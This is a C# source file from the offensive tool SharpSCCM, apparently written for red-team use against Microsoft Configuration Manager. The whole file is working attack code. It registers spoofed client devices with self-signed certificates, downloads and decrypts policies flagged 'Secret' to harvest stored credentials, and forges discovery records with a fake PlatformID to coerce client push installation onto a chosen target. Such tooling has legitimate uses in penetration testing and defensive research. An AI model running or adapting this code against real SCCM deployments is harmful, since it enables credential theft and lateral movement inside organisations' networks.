using System;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Security.Cryptography;
using System.Security.Cryptography.Pkcs;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Xml;

// Configuration Manager SDK
using Microsoft.ConfigurationManagement.Messaging.Framework;
using Microsoft.ConfigurationManagement.Messaging.Messages;
using Microsoft.ConfigurationManagement.Messaging.Sender.Http;

namespace SharpSCCM
{
    static class MgmtPointMessaging
    {
        static MessageCertificateX509 CreateCertificate()
        {
            // Generate certificate for signing and encrypting messages
            string[] oidPurposes = new string[] { "2.5.29.37" }; // Any extended key usage
            MessageCertificateX509 certificate = MessageCertificateX509.CreateSelfSignedCertificate("ConfigMgr Client Signing and Encryption", "ConfigMgr Client Signing and Encryption", oidPurposes, DateTime.Now, DateTime.Now.AddMonths(6));
            return certificate;
        }

        public static MessageCertificateX509Volatile CreateUserCertificate(string subjectName = null, bool store = false)
        {
            // Generate certificate for signing and encrypting messages
            if (string.IsNullOrEmpty(subjectName))
            {
                subjectName = "ConfigMgr Client Messaging";
            }
            using (RSA rsaKey = RSA.Create(2048))
            {
                CertificateRequest certRequest = new CertificateRequest($"CN={subjectName}", rsaKey, HashAlgorithmName.SHA256, RSASignaturePadding.Pkcs1);
                certRequest.CertificateExtensions.Add(new X509KeyUsageExtension(X509KeyUsageFlags.DigitalSignature | X509KeyUsageFlags.DataEncipherment, false));
                // Any extended key usage
                certRequest.CertificateExtensions.Add(new X509EnhancedKeyUsageExtension(new OidCollection { new Oid("1.3.6.1.4.1.311.101.2"), new Oid("1.3.6.1.4.1.311.101") }, true));
                X509Certificate2 certificate2 = certRequest.CreateSelfSigned(DateTimeOffset.Now, DateTimeOffset.Now.AddYears(1));
                certificate2.FriendlyName = $"{subjectName}";
                byte[] exportedCertBytes = certificate2.Export(X509ContentType.Pfx, string.Empty);
                X509Certificate2 exportedCert = new X509Certificate2(exportedCertBytes, string.Empty, X509KeyStorageFlags.Exportable);
                Console.WriteLine($"[+] Created \"{subjectName}\" certificate in memory for device registration and signing/encrypting subsequent messages");
                if (store)
                {
                    StoreCertificate(exportedCert, "My", StoreLocation.CurrentUser);
                }
                Console.WriteLine($"[+] Reusable Base64-encoded certificate:\n\n    {Helpers.ByteArrayToString(exportedCertBytes)}\n");
                MessageCertificateX509Volatile certificate = new MessageCertificateX509Volatile(exportedCert);
                return certificate;
            }
        }

        public static string DecryptPolicyBody(byte[] policyDownloadResponseBytes, MessageCertificateX509 encryptionCertificate)
        {
            // Parse response ASN1 and decrypt contents
            ContentInfo contentInfo = new ContentInfo(policyDownloadResponseBytes);
            EnvelopedCms pkcs7EnvelopedCms = new EnvelopedCms(contentInfo);
            pkcs7EnvelopedCms.Decode(policyDownloadResponseBytes);
            RecipientInfo encryptedKey = pkcs7EnvelopedCms.RecipientInfos[0];
            try
            {
                pkcs7EnvelopedCms.Decrypt(encryptedKey, new X509Certificate2Collection(encryptionCertificate.X509Certificate));
                Console.WriteLine($"[+] Successfully decoded and decrypted secret policy");
                string decryptedPolicyBody = Encoding.ASCII.GetString(pkcs7EnvelopedCms.ContentInfo.Content).Replace("\0", string.Empty);
                return decryptedPolicyBody;
            }
            catch (Exception)
            {
                Console.WriteLine("[!] Could not decrypt the secret policy");
                return null;
            }         
        }

        public static void DeleteCertificate(MessageCertificateX509 certificate)
        {
            var x509Store = new X509Store("My", StoreLocation.CurrentUser);
            x509Store.Open(OpenFlags.MaxAllowed);
            x509Store.Remove(certificate.X509Certificate);
            Console.WriteLine($"[+] Deleted the \"{certificate.X509Certificate.SubjectName.Name}\" certificate from {x509Store.Name} store for {x509Store.Location}");
        }

        public static void GetAvailablePackages(string managementPoint = null, string siteCode = null)
        {

        }

        public static (MessageCertificateX509, MessageCertificateX509, SmsClientId) GetCertsAndClientId(string managementPoint = null, string siteCode = null, string encodedCertificate = null, string providedClientId = null, string username = null, string password = null, string registerClient = null)
        {
            MessageCertificateX509 signingCertificate = null;
            MessageCertificateX509 encryptionCertificate = null;
            SmsClientId clientId = null;
           
            if (!string.IsNullOrEmpty(encodedCertificate) && !string.IsNullOrEmpty(providedClientId))
            {
                Console.WriteLine($"[+] Using provided certificate and SMS client ID: {providedClientId}");
                X509Certificate2 certificateToImport = new X509Certificate2(Helpers.StringToByteArray(encodedCertificate), string.Empty, X509KeyStorageFlags.Exportable);
                signingCertificate = new MessageCertificateX509Volatile(certificateToImport);
                encryptionCertificate = signingCertificate;
                clientId = new SmsClientId(providedClientId);
            }
            else if (string.IsNullOrEmpty(registerClient))
            {
                if (Helpers.IsHighIntegrity())
                {
                    (signingCertificate, encryptionCertificate) = (LocalSmsSigningCertificate(), LocalSmsEncryptionCertificate());
                    if (signingCertificate != null && encryptionCertificate != null)
                    {
                        clientId = ClientWmi.GetSmsId();
                    }
                    else
                    {
                        Console.WriteLine("[!] The SCCM client may not be installed on this machine");
                        Console.WriteLine("[!] Try registering a new device to obtain a client GUID and reusable certificate");
                        return (signingCertificate, encryptionCertificate, clientId);
                    }
                }
                else
                {
                    Console.WriteLine("[!] A new device record must be created when the user is not a local administrator");
                }
            }
            else
            {
                if (string.IsNullOrEmpty(managementPoint) || string.IsNullOrEmpty(siteCode))
                {
                    (managementPoint, siteCode) = ClientWmi.GetCurrentManagementPointAndSiteCode();
                }
                signingCertificate = CreateUserCertificate(null, false);
                encryptionCertificate = signingCertificate;
                string authenticationType = (!string.IsNullOrEmpty(username) && !string.IsNullOrEmpty(password)) ? "Windows": null;
                clientId = RegisterClient(signingCertificate, registerClient, managementPoint, siteCode, authenticationType, username, password);
            }
            return (signingCertificate, encryptionCertificate, clientId);
        }

        public static async void GetSecretsFromPolicy(string managementPoint, string siteCode, string encodedCertificate = null, string providedClientId = null, string username = null, string password = null, string registerClient = null, string outputPath = null)
        {
            // Thanks to Adam Chester(@_xpn_) for figuring this out! https://blog.xpnsec.com/unobfuscating-network-access-accounts/
            // Register a new client using NTLM authentication for the specified machine account to automatically approve the new device record, allowing secret policy retrieval

            (MessageCertificateX509 signingCertificate, MessageCertificateX509 encryptionCertificate, SmsClientId clientId) = GetCertsAndClientId(managementPoint, siteCode, encodedCertificate, providedClientId, username, password, registerClient);

            if (signingCertificate != null && encryptionCertificate != null && clientId != null)
            {
                // Send request for policy assignments to obtain policy locations
                ConfigMgrPolicyAssignmentReply assignmentReply = SendPolicyAssignmentRequest(clientId, signingCertificate, managementPoint, siteCode);

                // Get secret policies
                string outputFull = "";
                string outputCreds = "";
                foreach (PolicyAssignment policyAssignment in assignmentReply.ReplyAssignments.PolicyAssignments)
                {
                    if (policyAssignment.Policy.Flags.ToString().Contains("Secret"))
                    {
                        Console.WriteLine("[+] Found policy containing secrets:");
                        Console.WriteLine($"      ID: {policyAssignment.Policy.Id}");
                        Console.WriteLine($"      Flags: {policyAssignment.Policy.Flags}");
                        Console.WriteLine($"      URL: {policyAssignment.Policy.Location.Value}");

                        // Can't figure out how to authenticate with the SDK so using raw HTTP requests
                        string policyURL = policyAssignment.Policy.Location.Value.Replace("<mp>", managementPoint);
                        HttpResponseMessage policyDownloadResponse = SendPolicyDownloadRequest(policyURL, clientId.ToString(), encryptionCertificate);
                        byte[] policyDownloadResponseBytes = await policyDownloadResponse.Content.ReadAsByteArrayAsync();
                        Console.WriteLine($"[+] Received encoded response from server for policy {policyAssignment.Policy.Id}");
                        string decryptedPolicyBody = DecryptPolicyBody(policyDownloadResponseBytes, encryptionCertificate);
                        if (decryptedPolicyBody != null)
                        {
                            outputFull += decryptedPolicyBody;
                            XmlDocument policyXmlDoc = new XmlDocument();
                            policyXmlDoc.LoadXml(decryptedPolicyBody.Trim().Remove(0, 2));
                            XmlNodeList propertyNodeList = policyXmlDoc.GetElementsByTagName("property");
                            foreach (XmlNode propertyNode in propertyNodeList)
                            {
                                if (propertyNode.Attributes["secret"] != null)
                                {
                                    outputCreds += $"{propertyNode.Attributes["name"].Value}: {propertyNode.InnerText.Trim()}\n\n";
                                }
                            }
                        }

                        /*
                        // Code borrowed from SetCustomHeader method, exception on Decrypt method
                        ConfigMgrPolicyBodyDownloadRequest policyDownloadRequest = new ConfigMgrPolicyBodyDownloadRequest(assignmentReply, policyAssignment);
                        Dictionary<string, object> senderProperty = (Dictionary<string, object>)policyDownloadRequest.Settings.SenderProperties["HttpSender", "HttpHeaders"];
                        string clientTokenHeader = $"{clientId};{TimeHelpers.CurrentTimeAsIso8601};2";
                        senderProperty["ClientToken"] = clientTokenHeader;
                        senderProperty["ClientTokenSignature"] = certificate.Sign(clientTokenHeader + "\0", MessageCertificateSigningOptions.CryptNoHashId).HexBinaryEncode().ToUpperInvariant();
                        policyDownloadRequest.DownloadSecrets = true;
                        ConfigMgrPolicyBodyDownloadReply policyBodyDownloadReply = policyDownloadRequest.SendMessage(sender);
                        */
                    }
                }

                if (!string.IsNullOrEmpty(outputPath))
                {
                    File.WriteAllText(outputPath, outputFull);
                    Console.WriteLine($"[+] Wrote secret policies to {outputPath}");
                }

                if (!string.IsNullOrEmpty(outputCreds))
                {
                    Console.WriteLine($"[+] Encrypted secrets:\n\n{outputCreds.TrimEnd()}\n");
                    // Thanks to Evan McBroom for reversing and writing this decryption routine! https://gist.github.com/EvanMcBroom/525d84b86f99c7a4eeb4e3495cffcbf0
                    Console.WriteLine("[+] Encrypted hex strings can be decrypted offline using the \"DeobfuscateSecretString.exe <string>\" command");
                }
                else
                {
                    Console.WriteLine($"[+] No secret policies were found, which could result from using an unapproved device for policy retrieval\n" +
                        "[+] Try creating a new approved device by specifying a computer account (-u) and password (-p)");
                }
            }
        }

        public static MessageCertificateX509 LocalSmsEncryptionCertificate()
        {
            MessageCertificateX509 certificate = null;
            // Get encryption certificate used by the legitimate client when PKI is not in use
            try
            {
                certificate = MessageCertificateX509File.Find(StoreLocation.LocalMachine, "SMS", X509FindType.FindByApplicationPolicy, "1.3.6.1.4.1.311.101.2", false);
                Console.WriteLine("[+] Obtained SMS Encryption Certificate from local computer certificates store");
            }
            catch (CryptographicException)
            {
                Console.WriteLine($"[!] Could not locate the SMS Encryption Certificate in the local computer certificates store");
            }
            return certificate;
        }

        public static MessageCertificateX509 LocalSmsSigningCertificate()
        {

            MessageCertificateX509 certificate = null;
            // Get signing certificate used by the legitimate client when PKI is not in use
            try
            {
                certificate = MessageCertificateX509File.Find(StoreLocation.LocalMachine, "SMS", X509FindType.FindByApplicationPolicy, "1.3.6.1.4.1.311.101", false);
                Console.WriteLine("[+] Obtained SMS Signing Certificate from local computer certificates store");
            }
            catch (CryptographicException)
            {
                Console.WriteLine($"[!] Could not locate the SMS Signing Certificate in the local computer certificates store");
            }
            return certificate;
        }

        public static SmsClientId RegisterClient(MessageCertificateX509 certificate, string target, string managementPoint, string siteCode, string authenticationType = null, string username = null, string password = null)
        {
            SmsClientId clientId = null;
            HttpSender sender = new HttpSender();
            ConfigMgrRegistrationRequest registrationRequest = new ConfigMgrRegistrationRequest();
            // Add the certificate that will be tied to the new client ID for message signing and encryption
            registrationRequest.AddCertificateToMessage(certificate, CertificatePurposes.Signing | CertificatePurposes.Encryption);
            Console.WriteLine("[+] Discovering local properties for client registration request");
            registrationRequest.Discover();
            // Modify properties
            Console.WriteLine("[+] Modifying client registration request properties:");
            registrationRequest.AgentIdentity = "CCMSetup.exe";
            if (!string.IsNullOrEmpty(target))
            {
                registrationRequest.ClientFqdn = target;
                registrationRequest.NetBiosName = target;
            }
            Console.WriteLine($"      FQDN: {registrationRequest.ClientFqdn}"); // Original ClientFqdn derived from HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ComputerName\ActiveComputerName\ComputerName + <domain name>
            Console.WriteLine($"      NetBIOS name: {registrationRequest.NetBiosName}"); // Original NetBiosName derived from HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ComputerName\ActiveComputerName\ComputerName
            registrationRequest.Settings.HostName = managementPoint;
            registrationRequest.Settings.Compression = MessageCompression.Zlib;
            registrationRequest.Settings.ReplyCompression = MessageCompression.Zlib;
            registrationRequest.SiteCode = siteCode;
            if (authenticationType == "Windows")
            {
                registrationRequest.Settings.Security.AuthenticationType = AuthenticationType.WindowsAuth;
                if (!string.IsNullOrEmpty(username) && !string.IsNullOrEmpty(password))
                {
                    Console.WriteLine($"      Authenticating as: {username}");
                    registrationRequest.Settings.Security.Credentials = new NetworkCredential(username, password);
                }
            }
            Console.WriteLine($"      Site code: {registrationRequest.SiteCode}");
            // Serialize message XML
            registrationRequest.SerializeMessageBody();
            //Console.WriteLine($"\n[+] Registration Request Body:\n{System.Xml.Linq.XElement.Parse(registrationRequest.Body.ToString())}");
            // Register client and wait for a confirmation with the SmsId
            Console.WriteLine($"[+] Sending HTTP registration request to {registrationRequest.Settings.HostName}:{registrationRequest.Settings.HttpPort}");
            try
            {
                clientId = registrationRequest.RegisterClient(sender, TimeSpan.FromMinutes(5));
                Console.WriteLine($"[+] Received unique SMS client GUID for new device:\n\n    {clientId}\n");
            }
            catch (WebException ex)
            {
                Console.WriteLine($"[!] An exception occurred while contacting the management point: {ex.Message}");
            }
            return clientId;
        }

        public static void SendDDR(MessageCertificateX509 certificate, string target, string managementPoint, string siteCode, SmsClientId clientId)
        {
            HttpSender sender = new HttpSender();
            // Build a gratuitous heartbeat DDR to send inventory information for the newly created system to SCCM
            ConfigMgrDataDiscoveryRecordMessage ddrMessage = new ConfigMgrDataDiscoveryRecordMessage();
            // Add our certificate for message signing and encryption
            ddrMessage.AddCertificateToMessage(certificate, CertificatePurposes.Signing);
            ddrMessage.AddCertificateToMessage(certificate, CertificatePurposes.Encryption);
            Console.WriteLine("[+] Discovering local properties for DDR inventory report");
            // Generate inventory report XML
            ddrMessage.Discover();
            Console.WriteLine("[+] Modifying DDR and inventory report properties");
            // Set the client GUID to the one registered for the new fake client
            ddrMessage.SmsId = new SmsClientId(clientId.ToString());
            string originalSourceHost = ddrMessage.Settings.SourceHost;
            // Set target to local machine if not provided in command line option
            if (string.IsNullOrEmpty(target))
            {
                target = originalSourceHost;
            }
            ddrMessage.Settings.SourceHost = target;
            ddrMessage.NetBiosName = target;
            ddrMessage.SiteCode = siteCode;
            // Serialization is required to build the DDR XML and inventory report XML but must take place after all modifications to the DDR message body
            ddrMessage.SerializeMessageBody();
            // Update inventory report header with new device information
            ddrMessage.InventoryReport.ReportHeader.Identification.Machine.ClientId = new InventoryClientIdBase(clientId);
            ddrMessage.InventoryReport.ReportHeader.Identification.Machine.ClientInstalled = false;
            ddrMessage.InventoryReport.ReportHeader.Identification.Machine.NetBiosName = target;
            // Modify DDR XML
            string ddrBodyXml = ddrMessage.Body.ToString();
            XmlDocument ddrXmlDoc = new XmlDocument();
            // Add dummy root element to appease XmlDocument parser
            ddrXmlDoc.LoadXml("<root>" + ddrBodyXml + "</root>");
            XmlNode clientInstalled = ddrXmlDoc.SelectSingleNode("//ClientInstalled");
            clientInstalled.InnerText = "0";
            XmlNode modifiedDdrXml = ddrXmlDoc.SelectSingleNode("//root");
            ddrBodyXml = modifiedDdrXml.InnerXml;
            // Use reflection to modify read-only Body property
            typeof(MessageBody).GetProperty("Payload").SetValue(ddrMessage.Body, ddrBodyXml);
            // Modify inventory report XML
            string inventoryReportXml = ddrMessage.InventoryReport.ReportBody.RawXml;
            XmlDocument inventoryXmlDoc = new XmlDocument();
            // Add dummy root element to appease XmlDocument parser
            inventoryXmlDoc.LoadXml("<root>" + inventoryReportXml + "</root>");
            // Replace OperatingSystemVersion special attribute (a.k.a. PlatformID) with Windows Workstation to coerce client push installation
            XmlNode platformIdNode = inventoryXmlDoc.SelectSingleNode("//PlatformID");
            Console.WriteLine($"[+] Discovered PlatformID: {platformIdNode.InnerXml}");
            platformIdNode.InnerText = "Microsoft Windows NT Workstation 2010.0";
            Console.WriteLine($"[+] Modified PlatformID: {platformIdNode.InnerXml}");
            // Replace original FQDN with supplied one
            XmlNode fqdnNode = inventoryXmlDoc.SelectSingleNode("//FQDN");
            fqdnNode.InnerText = target;
            XmlNode modifiedXml = inventoryXmlDoc.SelectSingleNode("//root");
            inventoryReportXml = modifiedXml.InnerXml;
            // Replace original NetBIOS name with supplied name
            inventoryReportXml = inventoryReportXml.Replace(originalSourceHost, target);
            // Use reflection to modify read-only RawXml property
            typeof(InventoryReportBody).GetProperty("RawXml").SetValue(ddrMessage.InventoryReport.ReportBody, inventoryReportXml);
            // Display XML to user
            //Console.WriteLine($"\n[+] DDR Body:\n{System.Xml.Linq.XElement.Parse(ddrBodyXml)}");
            //Console.WriteLine($"\n[+] Inventory Report Body:\n{System.Xml.Linq.XElement.Parse("<root>" + ddrMessage.InventoryReport.ReportBody.RawXml + "</root>")}\n");
            // Assemble message and send
            ddrMessage.Settings.Compression = MessageCompression.Zlib;
            ddrMessage.Settings.ReplyCompression = MessageCompression.Zlib;
            ddrMessage.Settings.HostName = managementPoint;
            Console.WriteLine($"[+] Sending DDR from {ddrMessage.SmsId} to {ddrMessage.Settings.Endpoint} endpoint on {ddrMessage.Settings.HostName}:{ddrMessage.SiteCode} and requesting client installation on {target}");
            ddrMessage.SendMessage(sender);
        }

        public static ConfigMgrContentLocationReply SendContentLocationRequest(string managementPoint, string siteCode, string packageId, int packageVersion, bool cert = false)
        {
            HttpSender sender = new HttpSender();
            ConfigMgrContentLocationRequest contentLocationRequest = new ConfigMgrContentLocationRequest();
            contentLocationRequest.Discover();
            contentLocationRequest.Settings.HostName = managementPoint;
            contentLocationRequest.SiteCode = siteCode;
            contentLocationRequest.LocationRequest.Package.PackageId = packageId;
            contentLocationRequest.LocationRequest.Package.Version = packageVersion;
            ConfigMgrContentLocationReply contentLocationReply = contentLocationRequest.SendMessage(sender);
            Console.WriteLine(contentLocationReply.Body);
            return contentLocationReply;
        }

        public static ConfigMgrPolicyAssignmentReply SendPolicyAssignmentRequest(SmsClientId clientId, MessageCertificateX509 certificate, string managementPoint, string siteCode)
        {
            HttpSender sender = new HttpSender();
            ConfigMgrPolicyAssignmentRequest assignmentRequest = new ConfigMgrPolicyAssignmentRequest();
            // Sign message with the certificate associated with the SmsId
            assignmentRequest.AddCertificateToMessage(certificate, CertificatePurposes.Signing);
            assignmentRequest.SmsId = clientId;
            assignmentRequest.Settings.HostName = managementPoint;
            assignmentRequest.SiteCode = siteCode;
            Console.WriteLine($"[+] Obtaining {assignmentRequest.RequestType} {assignmentRequest.ResourceType} policy assignment from {assignmentRequest.Settings.HostName} {assignmentRequest.SiteCode}");
            ConfigMgrPolicyAssignmentReply assignmentReply = assignmentRequest.SendMessage(sender);
            Console.WriteLine($"[+] Found {assignmentReply.ReplyAssignments.PolicyAssignments.Count} policy assignments");
            return assignmentReply;
        }

        public static HttpResponseMessage SendPolicyDownloadRequest(string url, string clientId = null, MessageCertificateX509 certificate = null)
        {
            HttpClientHandler httpClientHandler = new HttpClientHandler() { AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate };
            HttpClient httpClient = new HttpClient(httpClientHandler);
            httpClient.DefaultRequestHeaders.Add("User-Agent", "ConfigMgr Messaging HTTP Sender");
            var request = new HttpRequestMessage(HttpMethod.Get, url);
            // Add authentication headers required to download policies flagged "Secret"
            if (!string.IsNullOrEmpty(clientId) && (certificate != null))
            {
                string currentTimeAsIso = TimeHelpers.CurrentTimeAsIso8601;
                string clientTokenHeader = $"{clientId};{currentTimeAsIso};2";
                httpClient.DefaultRequestHeaders.Add("ClientToken", clientTokenHeader);
                byte[] clientTokenHeaderBytes = Encoding.Unicode.GetBytes(clientTokenHeader + "\0");
                string clientTokenSignatureHeader = certificate.Sign(clientTokenHeaderBytes, "SHA256", MessageCertificateSigningOptions.CryptNoHashId).HexBinaryEncode().ToUpperInvariant();
                Console.WriteLine("[+] Adding authentication headers to download request:\n" +
                                  $"      ClientToken: {clientTokenHeader}\n" +
                                  $"      ClientTokenSignature: {clientTokenSignatureHeader}"
                                  );
                httpClient.DefaultRequestHeaders.Add("ClientTokenSignature", clientTokenSignatureHeader);
            }
            var response = httpClient.SendAsync(request).Result;
            return response;
        }

        public static X509Store StoreCertificate(X509Certificate2 certificate, string storeName, StoreLocation storeLocation)
        {
            var x509Store = new X509Store(storeName, storeLocation);
            x509Store.Open(OpenFlags.MaxAllowed);
            x509Store.Add(certificate);
            Console.WriteLine($"[+] Wrote \"{certificate.SubjectName.Name}\" certificate to {x509Store.Name} store for {x509Store.Location}");
            return x509Store;
        }
    }
}